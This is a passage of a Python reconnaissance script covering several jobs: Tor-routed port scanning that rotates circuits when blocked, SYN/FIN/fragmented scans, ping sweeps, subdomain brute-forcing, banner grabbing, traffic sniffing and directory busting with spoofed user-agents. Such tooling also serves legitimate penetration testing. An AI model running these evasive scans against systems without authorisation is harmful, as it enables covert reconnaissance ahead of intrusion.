    print(Colors.GREEN + "[+] Tor is ACTIVE!" + Colors.RESET)
    print(Colors.NEON_CYAN + f"[+] New IP:   {new_ip}" + Colors.RESET)
    print(Colors.NEON_CYAN + f"[+] Country:  {result['country']}" + Colors.RESET)
    print(Colors.NEON_CYAN + f"[+] Verified: {result['verified']}" + Colors.RESET)
    print(Colors.FRAME + "=" * 50 + Colors.RESET)
    print(Colors.YELLOW + "[!] Note: SYN/UDP/FIN/Fragment/Decoy scans use RAW sockets" + Colors.RESET)
    print(Colors.YELLOW + "[!] They BYPASS Tor and your real IP will be exposed!" + Colors.RESET)
    print(Colors.YELLOW + "[!] Only TCP-connect scan and HTTP requests go through Tor." + Colors.RESET)
    return result


def disable_tor():
    global _original_socket
    socket.socket = _original_socket
    try:
        socks.set_default_proxy()
    except Exception as e:
        logger.debug(f"disable_tor: {type(e).__name__}: {e}")


def tor_scan(target, ports, timeout=1.0, delay=0.0):
    if timeout < 2.0:
        timeout = 2.0
    open_ports, banners = [], {}
    print(Colors.GOLD + f"\n[*] Scanning {target} through Tor..." + Colors.RESET)
    print(Colors.DIM_GRAY + f"[*] Total ports to scan: {len(ports)}" + Colors.RESET)
    print(Colors.DIM_GRAY + f"[*] Delay: {delay}s" + Colors.RESET)
    print()

    scanned = 0
    total = len(ports)
    payloads = {
        80: b"HEAD / HTTP/1.0\r\nHost: test\r\n\r\n",
        443: b"HEAD / HTTP/1.0\r\nHost: test\r\n\r\n",
        8080: b"HEAD / HTTP/1.0\r\nHost: test\r\n\r\n",
        8443: b"HEAD / HTTP/1.0\r\nHost: test\r\n\r\n",
        25: b"EHLO test\r\n", 6379: b"PING\r\n",
    }

    def scan_tor(port):
        time.sleep(delay)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((target, port))
            banner = ""
            if result == 0:
                try:
                    if port in [443, 8443, 993, 995]:
                        try:
                            ctx = ssl.create_default_context()
                            ctx.check_hostname = False
                            ctx.verify_mode = ssl.CERT_NONE
                            s = ctx.wrap_socket(s, server_hostname=target)
                        except Exception as e:
                            logger.debug(f"scan_tor ssl {port}: {type(e).__name__}: {e}")

                    if port in payloads:
                        s.sendall(payloads[port])
                        data = s.recv(2048)
                        banner = data.decode(errors="ignore").strip()
                        if "Server:" in banner:
                            for line in banner.splitlines():
                                if "Server:" in line:
                                    banner = line.strip()
                                    break
                        elif "HTTP/" in banner:
                            banner = banner.splitlines()[0] if banner else ""
                        else:
                            banner = banner[:80]
                except Exception as e:
                    logger.debug(f"scan_tor banner {port}: {type(e).__name__}: {e}")
            s.close()
            return port, result == 0, banner
        except Exception as e:
            logger.debug(f"scan_tor {port}: {type(e).__name__}: {e}")
            return port, False, ""

    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(scan_tor, port): port for port in ports}
        for future in as_completed(futures):
            scanned += 1
            progress_bar(scanned, total)
            port, is_open, banner = future.result()
            if is_open:
                open_ports.append(port)
                if banner:
                    banners[port] = banner
                with print_lock:
                    sys.stdout.write("\r" + " " * 120 + "\r")
                    sys.stdout.flush()
                    service = get_service(port)
                    tag = f"<{service}>" if service else ""
                    banner_txt = f" | {banner}" if banner else ""
                    print(Colors.NEON_CYAN + f"[+] Port {port} OPEN (Tor) ---> " +
                          Colors.GREEN + f"{tag}" + Colors.DIM_GRAY + f"{banner_txt}" + Colors.RESET)
    sys.stdout.write("\n")
    sys.stdout.flush()
    return open_ports, banners


def scan_with_auto_retry(target, ports, timeout=1.0, delay=0.0, max_retries=5):
    for attempt in range(max_retries):
        print(Colors.GOLD + f"\n[*] Attempt {attempt + 1}/{max_retries}" + Colors.RESET)
        open_ports, banners = tor_scan(target, ports, timeout, delay)
        status = analyze_scan_result(open_ports, banners)
        if status == "success":
            print(Colors.GREEN + f"[+] Scan successful ({len(open_ports)} ports found)" + Colors.RESET)
            return open_ports, banners, attempt + 1
        elif status == "blocked":
            print(Colors.RED + f"[!] IP seems blocked by target" + Colors.RESET)
        elif status == "empty":
            print(Colors.YELLOW + f"[!] No ports found (may be blocked)" + Colors.RESET)
        if attempt < max_retries - 1:
            if new_tor_circuit():
                new_ip = get_ip_retry()
                if new_ip:
                    print(Colors.GREEN + f"[+] New IP: {new_ip} ({get_country(new_ip)})" + Colors.RESET)
            time.sleep(3)
    print(Colors.RED + f"[!] All {max_retries} attempts failed" + Colors.RESET)
    return [], {}, max_retries


def multi_target_scan(targets, scan_type, check_os=False, thread_count=15, timeout=1.0, delay=0.0):
    if scan_type == "3" and timeout < 2.0:
        timeout = 2.0
    all_results = {}
    for target in targets:
        target = target.strip()
        if not target:
            continue
        ip, hostname = resolve_target(target)
        if not is_valid_ip(ip):
            print(Colors.RED + f"[-] Can't resolve: {target}" + Colors.RESET)
            continue
        print(Colors.BLUE + f"\n[*] Scanning {target} ({ip})..." + Colors.RESET)

        open_ports, banners = [], {}
        os_type = "Not checked"

        if scan_type == "3":
            ports = sorted(UDP_SERVICES.keys())
        else:
            ports = sorted(SERVICES.keys())

        scanned, total = 0, len(ports)
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = {}
            for port in ports:
                if scan_type == "2":
                    fut = executor.submit(syn_scan_port, ip, port, timeout,
                                          check_os=check_os, delay=delay)
                elif scan_type == "3":
                    fut = executor.submit(udp_scan_port, ip, port, timeout, delay=delay)
                else:
                    fut = executor.submit(scan_port, ip, port, timeout, delay=delay)
                futures[fut] = port

            for future in as_completed(futures):
                scanned += 1
                progress_bar(scanned, total)
                try:
                    result = future.result()
                    if scan_type == "2":
                        port, status, banner, os_result = result
                        if check_os and os_type == "Not checked" and os_result != "Unknown":
                            os_type = os_result
                        is_open = bool(status)
                    elif scan_type == "3":
                        port, status, banner = result
                        is_open = status in ("OPEN", "OPEN|FILTERED")
                    else:
                        port, status, banner = result
                        is_open = bool(status)
                    if is_open:
                        open_ports.append(port)
                        if banner:
                            banners[port] = banner
                except Exception as e:
                    logger.debug(f"multi_target_scan: {type(e).__name__}: {e}")

        sys.stdout.write("\n" + " " * 120 + "\r")
        sys.stdout.flush()
        all_results[target] = {"ip": ip, "open_ports": sorted(set(open_ports)),
                               "banners": banners, "os_type": os_type}
        print(Colors.GOLD + f"  [*] {target}: {len(open_ports)} open port(s)" + Colors.RESET)
    return all_results


def resolve_target(target):
    try:
        socket.inet_aton(target)
        ip = target
    except OSError:
        try:
            ip = socket.gethostbyname(target)
        except socket.gaierror:
            return target, "N/A"
    try:
        hostname = socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror, OSError):
        hostname = "N/A"
    return ip, hostname


def ping_sweep(network, timeout=1):
    alive_hosts = []
    try:
        net = ip_network(network, strict=False)
        all_hosts = list(net.hosts())
        if len(all_hosts) > MAX_PING_SWEEP_HOSTS:
            print(Colors.YELLOW + f"[!] Network too large ({len(all_hosts)} hosts). "
                                  f"Limiting to first {MAX_PING_SWEEP_HOSTS}." + Colors.RESET)
            all_hosts = all_hosts[:MAX_PING_SWEEP_HOSTS]
        ips = [str(ip) for ip in all_hosts]
        print(Colors.GOLD + f"\n[*] Ping Sweep on {network}..." + Colors.RESET)
        print(Colors.DIM_GRAY + f"[*] Total IPs to check: {len(ips)}" + Colors.RESET)

        def check_host(ip):
            try:
                pkt = IP(dst=ip) / ICMP()
                resp = sr1(pkt, timeout=timeout, verbose=0)
                if resp:
                    return ip, True, resp[IP].ttl
                return ip, False, None
            except Exception as e:
                logger.debug(f"ping_sweep {ip}: {type(e).__name__}: {e}")
                return ip, False, None

        scanned, total = 0, len(ips)
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(check_host, ip): ip for ip in ips}
            for future in as_completed(futures):
                scanned += 1
                progress_bar(scanned, total)
                ip, is_alive, ttl = future.result()
                if is_alive:
                    alive_hosts.append((ip, ttl))
                    with print_lock:
                        sys.stdout.write("\r" + " " * 120 + "\r")
                        sys.stdout.flush()
                        print(Colors.GREEN + f"[+] {ip} is ALIVE (TTL={ttl})" + Colors.RESET)
        sys.stdout.write("\n" + " " * 120 + "\r")
        sys.stdout.flush()
        return alive_hosts
    except Exception as e:
        print(Colors.RED + f"[!] Error: {e}" + Colors.RESET)
        logger.debug(f"ping_sweep: {type(e).__name__}: {e}")
        return []


def subdomain_scanner(domain, timeout=2):
    subdomains = ["www", "mail", "ftp", "admin", "api", "dev", "test",
                  "blog", "shop", "cdn", "dns", "vpn", "remote", "portal",
                  "secure", "login", "dashboard", "panel", "webmail", "ns1", "ns2"]
    found = []
    print(Colors.GOLD + f"\n[*] Scanning subdomains for {domain}..." + Colors.RESET)
    print(Colors.DIM_GRAY + f"[*] Total subdomains to check: {len(subdomains)}" + Colors.RESET)

    def check_subdomain(sub):
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            return full, ip, True
        except Exception as e:
            logger.debug(f"check_subdomain {full}: {type(e).__name__}: {e}")
            return full, "", False

    scanned, total = 0, len(subdomains)
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_subdomain, sub): sub for sub in subdomains}
        for future in as_completed(futures):
            scanned += 1
            progress_bar(scanned, total)
            full, ip, is_found = future.result()
            if is_found:
                found.append((full, ip))
                with print_lock:
                    sys.stdout.write("\r" + " " * 120 + "\r")
                    sys.stdout.flush()
                    print(Colors.GREEN + f"[+] {full} --> {ip}" + Colors.RESET)
    sys.stdout.write("\n" + " " * 120 + "\r")
    sys.stdout.flush()
    return found


def grab_banner_from_udp(target, port, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.settimeout(timeout)
        s.sendto(b"", (target, port))
        data, _ = s.recvfrom(1024)
        return data.decode(errors="ignore").strip()[:80]
    except (socket.timeout, OSError):
        return ""
    finally:
        s.close()


def udp_scan_port(target, port, timeout, delay=0.0):
    time.sleep(delay)
    try:
        pkt = IP(dst=target) / UDP(dport=port)
        resp = sr1(pkt, timeout=timeout, verbose=0)
        status = "UNKNOWN"
        banner = ""
        if resp is None:
            status = "OPEN|FILTERED"
        elif resp.haslayer(ICMP):
            icmp = resp[ICMP]
            if icmp.type == 3 and icmp.code == 3:
                status = "CLOSED"
            elif icmp.type == 3 and icmp.code in [1, 2, 9, 10, 13]:
                status = "FILTERED"
        elif resp.haslayer(UDP):
            banner = grab_banner_from_udp(target, port, timeout)
            status = "OPEN"

        if status == "OPEN":
            with print_lock:
                sys.stdout.write("\r" + " " * 120 + "\r")
                sys.stdout.flush()
                service = get_service(port)
                tag = f"<{service}>" if service else ""
                banner_txt = f" | {banner}" if banner else ""
                print(Colors.NEON_CYAN + f"[+] Port {port} OPEN (UDP) ---> " +
                      Colors.GREEN + f"{tag}" + Colors.DIM_GRAY + f"{banner_txt}" + Colors.RESET)

        return port, status, banner
    except Exception as e:
        logger.debug(f"udp_scan_port {port}: {type(e).__name__}: {e}")
        return port, "UNKNOWN", ""


def get_version_banner(target, port, timeout=2.0):
    payloads = {
        21: b"", 22: b"", 23: b"", 25: b"EHLO test\r\n",
        80: b"HEAD / HTTP/1.0\r\nHost: test\r\n\r\n",
        443: b"HEAD / HTTP/1.0\r\nHost: test\r\n\r\n",
        6379: b"PING\r\n",
        8080: b"HEAD / HTTP/1.0\r\nHost: test\r\n\r\n",
        8443: b"HEAD / HTTP/1.0\r\nHost: test\r\n\r\n",
    }
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(timeout)
        if s.connect_ex((target, port)) != 0:
            return ""
        if port in [443, 8443, 993, 995]:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            except Exception as e:
                logger.debug(f"get_version_banner ssl {port}: {type(e).__name__}: {e}")
        payload = payloads.get(port, b"")
        if payload:
            s.sendall(payload)
        data = s.recv(2048)
        banner = data.decode(errors="ignore").strip()
        if port == 22 and "SSH-" in banner:
            parts = banner.split("-")
            if len(parts) >= 3:
                return f"SSH {parts[2]}"
        if port == 3306 and data:
            try:
                null_pos = data.index(b'\x00', 1)
                version = data[1:null_pos].decode(errors="ignore")
                return f"MySQL {version}"
            except Exception as e:
                logger.debug(f"get_version_banner mysql: {type(e).__name__}: {e}")
        if "HTTP/" in banner or "Server:" in banner:
            status_line = banner.splitlines()[0] if banner else ""
            for line in banner.splitlines():
                if "Server:" in line:
                    return f"{status_line} | {line.strip()}"
            return status_line
        return banner[:200]
    except (socket.timeout, OSError):
        return ""
    finally:
        try:
            s.close()
        except Exception as e:
            logger.debug(f"get_version_banner close: {type(e).__name__}: {e}")


def scan_port(target, port, timeout, delay=0.0):
    time.sleep(delay)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.settimeout(timeout)
            result = s.connect_ex((target, port))
        finally:
            s.close()
        is_open = result == 0
        banner = ""
        if is_open:
            banner = get_version_banner(target, port, timeout)
            with print_lock:
                sys.stdout.write("\r" + " " * 120 + "\r")
                sys.stdout.flush()
                service = get_service(port)
                tag = f"<{service}>" if service else ""
                banner_txt = f" | {banner}" if banner else ""
                print(Colors.NEON_CYAN + f"[+] Port {port} OPEN --> " +
                      Colors.GREEN + f"{tag}" + Colors.DIM_GRAY + f"{banner_txt}" + Colors.RESET)
        return port, is_open, banner
    except socket.gaierror:
        raise
    except Exception as e:
        logger.debug(f"scan_port {port}: {type(e).__name__}: {e}")
        return port, False, ""


def syn_scan_port(target, port, timeout, check_os=False, delay=0.0):
    time.sleep(delay)
    try:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=timeout, verbose=0)
        if not resp or not resp.haslayer(TCP):
            return port, False, "", "Unknown"
        flags = int(resp[TCP].flags)
        if flags == 0x12:
            os_type = "Unknown"
            if check_os:
                os_type = get_os_simple(resp[IP].ttl)
            rst_pkt = IP(dst=target) / TCP(dport=port, sport=resp[TCP].dport,
                                           seq=resp[TCP].ack, ack=resp[TCP].seq + 1, flags="R")
            sr(rst_pkt, timeout=0.5, verbose=0)
            banner = get_version_banner(target, port, timeout)
            with print_lock:
                sys.stdout.write("\r" + " " * 120 + "\r")
                sys.stdout.flush()
                service = get_service(port)
                tag = f"<{service}>" if service else ""
                banner_txt = f" | {banner}" if banner else ""
                os_txt = f" | OS: {os_type}" if check_os and os_type != "Unknown" else ""
                print(Colors.NEON_CYAN + f"[+] Port {port} OPEN (SYN) ---> " +
                      Colors.GREEN + f"{tag}" + Colors.DIM_GRAY + f"{banner_txt}" +
                      Colors.GOLD + f"{os_txt}" + Colors.RESET)
            return port, True, banner, os_type
        return port, False, "", "Unknown"
    except Exception as e:
        logger.debug(f"syn_scan_port {port}: {type(e).__name__}: {e}")
        return port, False, "", "Unknown"


def fin_scan_port(target, port, timeout, delay=0.0):
    time.sleep(delay)
    try:
        pkt = IP(dst=target) / TCP(dport=port, flags="F")
        resp = sr1(pkt, timeout=timeout, verbose=0)
        status = "UNKNOWN"
        if resp is None:
            status = "OPEN|FILTERED"
        elif resp.haslayer(TCP):
            status = "CLOSED" if int(resp[TCP].flags) == 0x14 else "OPEN"

        if status == "OPEN":
            with print_lock:
                sys.stdout.write("\r" + " " * 120 + "\r")
                sys.stdout.flush()
                service = get_service(port)
                tag = f"<{service}>" if service else ""
                print(Colors.NEON_CYAN + f"[+] Port {port} OPEN (FIN) ---> " +
                      Colors.GREEN + f"{tag}" + Colors.RESET)

        return port, status, ""
    except Exception as e:
        logger.debug(f"fin_scan_port {port}: {type(e).__name__}: {e}")
        return port, "UNKNOWN", ""


def fragment_scan_port(target, port, timeout, delay=0.0):
    time.sleep(delay)
    try:
        pkt = IP(dst=target, flags="MF") / TCP(dport=port, flags="S")
        frags = fragment(pkt, fragsize=24)
        if not frags:
            return port, "UNKNOWN", ""
        resp = sr1(frags, timeout=timeout, verbose=0)
        status = "UNKNOWN"
        if resp is None:
            status = "FILTERED"
        elif resp.haslayer(TCP):
            flags = int(resp[TCP].flags)
            if flags == 0x12:
                status = "OPEN"
            elif flags == 0x14:
                status = "CLOSED"

        if status == "OPEN":
            with print_lock:
                sys.stdout.write("\r" + " " * 120 + "\r")
                sys.stdout.flush()
                service = get_service(port)
                tag = f"<{service}>" if service else ""
                print(Colors.NEON_CYAN + f"[+] Port {port} OPEN (Fragment) ---> " +
                      Colors.GREEN + f"{tag}" + Colors.RESET)

        return port, status, ""
    except Exception as e:
        logger.debug(f"fragment_scan_port {port}: {type(e).__name__}: {e}")
        return port, "UNKNOWN", ""


def save_results_html(target, open_ports, banners, scan_time, os_type, hostname, scan_type):
    filename = f"scan_{_safe_filename(target)}_{int(time.time())}.html"
    ip, _ = resolve_target(target)
    scan_type_text = "UDP" if scan_type == "3" else "TCP"
    safe_target = _html.escape(str(target))
    safe_ip = _html.escape(str(ip))
    safe_os = _html.escape(str(os_type))
    safe_host = _html.escape(str(hostname))
    html = f"""<!DOCTYPE html><html><head><title>SCAN WORK</title></head><body>
<h3>SCAN WORK</h3><table border="1" width="80%" cellpadding="15">
<tr><td><strong>Target</strong></td><td>{safe_target}</td></tr>
<tr><td><strong>IP</strong></td><td>{safe_ip}</td></tr>
<tr><td><strong>OS</strong></td><td>{safe_os}</td></tr>
<tr><td><strong>Hostname</strong></td><td>{safe_host}</td></tr>
<tr><td><strong>Scan Type</strong></td><td>{scan_type_text}</td></tr>
<tr><td><strong>Open Ports</strong></td><td>{len(open_ports)}</td></tr>
<tr><td><strong>Time</strong></td><td>{scan_time:.2f}s</td></tr></table>
<h2>OPEN PORTS</h2><table border="1" width="80%" cellpadding="10">
<tr><td><strong>Port</strong></td><td><strong>Service</strong></td><td><strong>Banner</strong></td></tr>"""
    for p in open_ports:
        banner_esc = _html.escape(str(banners.get(p, "")))
        service_esc = _html.escape(get_service(p))
        html += f'<tr><td>{p}</td><td>{service_esc}</td><td>{banner_esc}</td></tr>'
    html += '</table><br><p align="center">t.me/xomlsx</p></body></html>'
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)
    return filename


def save_results(target, scan_type, open_ports, open_filtered_ports, filtered_ports,
                 banners, scan_time, os_type, hostname):
    filename = f"scan_{_safe_filename(target)}_{int(time.time())}.txt"
    is_udp = scan_type == "3"

    scan_type_labels = {
        "1": "TCP Connect",
        "2": "TCP SYN (Half-Open)",
        "3": "UDP",
        "4": "TCP FIN (Stealth)",
        "5": "TCP Fragment",
    }
    scan_type_text = scan_type_labels.get(scan_type, "TCP")

    with open(filename, "w", encoding="utf-8") as f:
        f.write("=" * 60 + "\n  SCAN WORK - RESULTS\n" + "=" * 60 + "\n\n")
        f.write(f"Target          : {target}\n")
        f.write(f"Hostname        : {hostname}\n")
        f.write(f"Scan Type       : {scan_type_text}\n")
        f.write(f"OS              : {os_type}\n")
        f.write(f"Scan Time       : {scan_time:.2f} seconds\n")
        f.write(f"Open Ports      : {len(open_ports)}\n")
        if scan_type in ["3", "4", "5"]:
            f.write(f"Open|Filtered   : {len(open_filtered_ports)}\n")
            f.write(f"Filtered        : {len(filtered_ports)}\n")
        f.write("\n" + "-" * 60 + "\n  RESULTS\n" + "-" * 60 + "\n")
        if open_ports:
            for p in open_ports:
                service = get_udp_service(p) if is_udp else get_service(p)
                banner = banners.get(p, "")
                f.write(f"  Port {p:<6} {service:<15} OPEN{' | ' + banner if banner else ''}\n")
        else:
            f.write("  No confirmed open ports found.\n")
        f.write("\n" + "=" * 60 + "\n  t.me/xomlsx\n" + "=" * 60 + "\n")
    return filename


def show_monitor_modes():
    box_top()
    box_line("SELECT MONITOR MODE", text_color=Colors.NEON_CYAN + Colors.BOLD)
    box_divider()
    box_line("1) TCP traffic", text_color=Colors.SKY_BLUE)
    box_line("2) HTTP requests", text_color=Colors.SKY_BLUE)
    box_line("3) HTTPS/TLS traffic", text_color=Colors.SKY_BLUE)
    box_line("4) UDP traffic", text_color=Colors.SKY_BLUE)
    box_line("5) DNS queries", text_color=Colors.SKY_BLUE)
    box_line("6) All supported traffic", text_color=Colors.SKY_BLUE)
    box_bottom()


def _monitor_tcp(packet):
    if not packet.haslayer(IP) or not packet.haslayer(TCP):
        return
    print(
        Colors.CYAN + f"[TCP] {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport} [{packet[TCP].flags}]" + Colors.RESET)


def _monitor_udp(packet):
    if not packet.haslayer(IP) or not packet.haslayer(UDP):
        return
    print(
        Colors.YELLOW + f"[UDP] {packet[IP].src}:{packet[UDP].sport} -> {packet[IP].dst}:{packet[UDP].dport}" + Colors.RESET)


def _monitor_http(packet):
    if not packet.haslayer(IP) or not packet.haslayer(TCP):
        return
    if packet[TCP].sport != 80 and packet[TCP].dport != 80:
        return
    if packet.haslayer(HTTPRequest):
        req = packet[HTTPRequest]
        method = req.Method.decode(errors="ignore") if req.Method else ""
        host = req.Host.decode(errors="ignore") if req.Host else ""
        path = req.Path.decode(errors="ignore") if req.Path else ""
        print(Colors.GREEN + f"[HTTP] {method} {host}{path}" + Colors.RESET)
    elif packet.haslayer(Raw):
        first = packet[Raw].load.decode(errors="ignore").split("\r\n", 1)[0]
        if first.startswith(("GET ", "POST ", "PUT ", "DELETE ")):
            print(Colors.GREEN + f"[HTTP] {first[:120]}" + Colors.RESET)


def _monitor_https(packet):
    if not packet.haslayer(IP) or not packet.haslayer(TCP):
        return
    if packet[TCP].sport != 443 and packet[TCP].dport != 443:
        return
    print(
        Colors.MAGENTA + f"[HTTPS] {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}" + Colors.RESET)


def _monitor_dns(packet):
    if not packet.haslayer(IP) or not packet.haslayer(DNS):
        return
    dns = packet[DNS]
    query = dns.qd.qname.decode(errors="ignore").rstrip(".") if dns.qd and dns.qd.qname else "?"
    print(Colors.BLUE + f"[DNS] {packet[IP].src} -> {packet[IP].dst}: {query}" + Colors.RESET)


def monitor_packet(packet, mode):
    try:
        if mode == "1":
            _monitor_tcp(packet)
        elif mode == "2":
            _monitor_http(packet)
        elif mode == "3":
            _monitor_https(packet)
        elif mode == "4":
            _monitor_udp(packet)
        elif mode == "5":
            _monitor_dns(packet)
        else:
            if packet.haslayer(TCP):
                _monitor_tcp(packet)
            if packet.haslayer(UDP):
                _monitor_udp(packet)
            if packet.haslayer(DNS):
                _monitor_dns(packet)
            if packet.haslayer(HTTPRequest):
                _monitor_http(packet)
            elif packet.haslayer(TCP) and (packet[TCP].dport == 443 or packet[TCP].sport == 443):
                _monitor_https(packet)
    except (AttributeError, IndexError, UnicodeDecodeError, TypeError) as e:
        logger.debug(f"monitor_packet: {type(e).__name__}: {e}")
        return


def monitor_banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(Colors.ORANGE + """
 ███╗   ███╗ ██████╗ ███╗   ██╗██╗████████╗ ██████╗ ██████╗
 ████╗ ████║██╔═══██╗████╗  ██║██║╚══██╔══╝██╔═══██╗██╔══██╗
 ██╔████╔██║██║   ██║██╔██╗ ██║██║   ██║   ██║   ██║██████╔╝
 ██║╚██╔╝██║██║   ██║██║╚██╗██║██║   ██║   ██║   ██║██╔══██╗
 ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██║   ██║   ╚██████╔╝██║  ██║
 ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
""" + Colors.RESET)


def start_network_monitor():
    show_monitor_modes()
    mode = typed_input(Colors.AQUA + "[?] Choose monitor mode (1-6): " + Colors.RESET).strip()
    if mode not in {"1", "2", "3", "4", "5", "6"}:
        print(Colors.RED + "[!] Invalid monitor mode." + Colors.RESET)
        return
    mode_names = {"1": "TCP", "2": "HTTP", "3": "HTTPS/TLS", "4": "UDP", "5": "DNS", "6": "ALL"}
    filters = {"2": "tcp port 80", "3": "tcp port 443", "5": "udp port 53"}
    print(Colors.GREEN + f"\n[*] Monitoring: {mode_names[mode]}" + Colors.RESET)
    print(Colors.YELLOW + "[*] Press Ctrl+C to stop." + Colors.RESET)
    try:
        sniff(filter=filters.get(mode), prn=lambda p: monitor_packet(p, mode), store=False)
    except KeyboardInterrupt:
        print(Colors.YELLOW + "\n[!] Monitoring stopped." + Colors.RESET)
    except PermissionError:
        print(Colors.RED + "\n[!] Run as Administrator/root." + Colors.RESET)
    except OSError as exc:
        print(Colors.RED + f"\n[!] Capture failed: {exc}" + Colors.RESET)


# ========== DIRECTORY BUSTER ==========

def select_db_connection():
    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT CONNECTION MODE{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"  {Colors.GREEN}1){Colors.RESET} Direct        {Colors.DIM}(no Proxy){Colors.RESET}")
    print(f"  {Colors.GREEN}2){Colors.RESET} Tor           {Colors.DIM}(127.0.0.1:9050){Colors.RESET}")
    print(f"  {Colors.GREEN}3){Colors.RESET} Custom Proxy  {Colors.DIM}(HTTP/SOCKS){Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    choice = input(f"{Colors.CYAN}[?] Choose connection (1-3): {Colors.RESET}").strip()
    if choice == "2":
        return {"mode": "tor", "proxies": None}
    elif choice == "3":
        proxy = input(f"{Colors.CYAN}[?] Proxy (e.g. http://127.0.0.1:8080): {Colors.RESET}").strip()
        return {"mode": "proxy", "proxies": {"http": proxy, "https": proxy}}
    return {"mode": "direct", "proxies": None}


def select_user_agent_mode():
    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT USER-AGENT MODE{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(
        f"  {Colors.GREEN}1){Colors.RESET} Built-in       {Colors.DIM}({len(BROWSER_PROFILES)} Profiles){Colors.RESET}")
    print(f"  {Colors.GREEN}2){Colors.RESET} Faker          {Colors.DIM}(random){Colors.RESET}")
    print(f"  {Colors.GREEN}3){Colors.RESET} Combined       {Colors.DIM}(Built-in + Faker){Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    choice = input(f"{Colors.CYAN}[?] Choose mode (1-3): {Colors.RESET}").strip()
    reset_profile_cycle(BROWSER_PROFILES)
    if choice == "2":
        return "faker"
    elif choice == "3":
        return "combined"
    return BROWSER_PROFILES


def select_db_speed(wordlist_size=None):
    print()
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"{Colors.BOLD}  SELECT SCAN SPEED{Colors.RESET}")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    print(f"  {Colors.GREEN}1){Colors.RESET} Super Slow   {Colors.DIM}(5 threads,   1.0s delay){Colors.RESET}")
    print(f"  {Colors.GREEN}2){Colors.RESET} Slow         {Colors.DIM}(10 threads,  0.5s delay){Colors.RESET}")
    print(f"  {Colors.GREEN}3){Colors.RESET} Normal       {Colors.DIM}(15 threads,  0.2s delay){Colors.RESET}")
    print(f"  {Colors.GREEN}4){Colors.RESET} Fast         {Colors.DIM}(20 threads,  0.05s delay){Colors.RESET}")
    print(f"  {Colors.GREEN}5){Colors.RESET} Super Fast   {Colors.DIM}(25 threads,  0.01s delay){Colors.RESET}")
    print(f"  {Colors.GREEN}6){Colors.RESET} Custom")
    print(f"{Colors.CYAN}{'=' * 55}{Colors.RESET}")
    choice = input(f"{Colors.CYAN}[?] Choose speed (1-6): {Colors.RESET}").strip()
    settings = {"1": (5, 1.0, "Super Slow"), "2": (10, 0.5, "Slow"),
                "3": (15, 0.2, "Normal"), "4": (20, 0.05, "Fast"),
                "5": (25, 0.01, "Super Fast")}
    if choice in settings:
        threads, delay, label = settings[choice]
    elif choice == "6":
        t = input(f"{Colors.CYAN}[?] Threads: {Colors.RESET}").strip()
        d = input(f"{Colors.CYAN}[?] Delay (seconds): {Colors.RESET}").strip()
        threads = int(t) if t.isdigit() else 15
        delay = float(d) if d.replace(".", "", 1).isdigit() else 0.2
        label = f"Custom ({threads}t, {delay}s)"
    else:
        threads, delay, label = 15, 0.2, "Normal"
    if wordlist_size and threads > wordlist_size:
        threads = wordlist_size
        label += " (adj)"
    return threads, delay, label


def is_real_redirect(location, url, base_url):
    if not location:
        return False
    if location in ["/", base_url, base_url + "/"]:
        return False
    if location == url.replace("http://", "https://"):
        return False
    return True


def test_directory(base_url, path, timeout=10, delay=0.0, proxies=None, ua_mode=None, baseline_len=None):
    if delay > 0:
        time.sleep(random.uniform(delay * 0.5, delay * 1.5))
    url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
    try:
        if ua_mode == "faker" or (ua_mode == "combined" and random.random() < 0.3):
            profile = get_faker_profile()
        else:
            profile = get_next_profile()
        r = requests.get(url, timeout=timeout, allow_redirects=True,
                         headers=profile["headers"], proxies=proxies)
        if baseline_len and abs(len(r.content) - baseline_len) < 100:
            return None
        if r.status_code == 404:
            return None
        return {"url": r.url, "status": r.status_code,
                "length": len(r.content), "location": r.url if r.history else ""}
    except requests.exceptions.Timeout:
        print(f"{Colors.YELLOW}[TIMEOUT] {url}{Colors.RESET}")
        return None
    except requests.exceptions.SSLError:
        print(f"{Colors.YELLOW}[SSL] {url}{Colors.RESET}")
        return None
    except requests.exceptions.ConnectionError:
        print(f"{Colors.YELLOW}[CONN] {url}{Colors.RESET}")
        return None
    except Exception as e:
        print(f"{Colors.RED}[ERR] {url}: {type(e).__name__}: {e}{Colors.RESET}")
        return None


def directory_buster(base_url, wordlist_path, threads=15, delay=0.2, timeout=10,
                     speed_label="Normal", proxies=None, ua_mode=None):
    print(f"\n[*] Target: {base_url}")
